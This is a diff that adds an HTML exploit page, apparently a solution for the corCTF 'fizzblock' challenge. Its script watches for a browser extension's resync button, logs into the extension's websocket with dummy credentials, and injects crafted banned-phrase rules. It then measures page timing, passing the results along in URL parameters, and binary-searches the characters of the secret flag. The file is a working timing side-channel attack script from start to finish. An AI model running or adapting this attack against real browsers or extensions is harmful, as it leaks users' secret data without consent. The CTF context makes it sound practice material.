@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>pepega</title>
+  </head>
+  <body>
+    <script>
+      //fetch(`/?page_opened`);
+      const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+      const urlParams = new URLSearchParams(window.location.search);
+      const time = urlParams.get('time') || -1;
+      //const remote = "wss://fizzblock-101-8c11a20e2c0bdf0b.ctfi.ng/ws";
+      const remote = "ws://localhost:3000/ws";
+
+      let base = urlParams.get('base') || "corctf{";
+      let leftidx = parseInt(urlParams.get('leftidx')) || 0;
+      let rightidx = parseInt(urlParams.get('rightidx')) || chars.length;
+      const count = parseInt(urlParams.get('count')) || 15;
+      let mid = Math.floor((leftidx + rightidx)/2);
+      console.log(`Leftidx at ${leftidx} and rightidx at ${rightidx}`);
+      console.log(`Midpoint is at ${mid}`);
+      if (time > 2000) { // match!
+        console.log(`Matched, rightidx needs to come down to ${mid}`);
+        rightidx = mid;
+      }
+      else if (time > 0) { // no match!
+        console.log(`No match, leftidx needs to go up to ${mid+1}`);
+        leftidx = mid+1;
+      }
+      if (leftidx == rightidx) { // found!
+        base = base + chars[leftidx];
+        console.log(base);
+        leftidx = 0;
+        rightidx = chars.length - 1;
+      }
+      mid = Math.floor((leftidx + rightidx)/2);
+      console.log(`Testing from ${chars[leftidx]} to ${chars[mid]}`);
+      const banned_phrases = [];
+      for (let i = leftidx; i < mid+1; i++) {
+        banned_phrases.push(base + chars[i]);
+      }
+      for (let i = 0; i < count; i++) {
+        banned_phrases.push('[CENS');
+	banned_phrases.push('ORED]');
+      }
+      //fetch(`/?math_finished`);
+      const extension_form_observer = new MutationObserver(async () => {
+        const button = document.querySelector('#resync');
+        if (button) { // button exists, go ham
+          //fetch(`/?button_hooked`);
+          if (button.textContent === "Synced!") { // ready to reload
+            //alert("Button finished!");
+            //fetch(`/?synced`);
+            console.log("Button says 'Synced!', redirecting!");
+            await new Promise(r => setTimeout(r, 200));
+            window.location.href = `./timing.html?base=${base}&leftidx=${leftidx}&rightidx=${rightidx}&count=${count}`;
+          }
+          else if (button.textContent === "Resync block settings") { // register rules    
+            //fetch(`/?hooking_socket`);
+            let socket = new WebSocket(remote);
+            socket.onopen = (event) => {
+              console.log(`Connected.`);
+            };
+
+            let state = 0;
+
+            socket.onmessage = async (event) => {
+              console.log(`Websocket received message: ${event.data}`);
+              if (state === 0) { // should we check event.data === "ready"? it's probably fine, right
+                console.log("Sending name...");
+                socket.send("a");
+                state++;
+              }
+              else if (state === 1) {
+                console.log("Sending password...");
+                socket.send("a");
+                state++;
+              }
+              else if (state === 2) {
+                console.log("Rejecting update...");
+                socket.send("no");
+                console.log("Sending payload...");
+                socket.send(JSON.stringify({type: 'update', feed: "pwn", banned_phrases: banned_phrases}));
+                state++;
+              }
+              else {
+                //fetch(`/?trigger_button`);
+                console.log("Clicking button...");
+                button.click()
+              }
+            };
+          }
+        }
+      });
+
+      extension_form_observer.observe(document.body, {
+        childList: true,
+        subtree: true
+      });
+    </script>
+    <h1>yep</h1>
+  </body>
+</html>
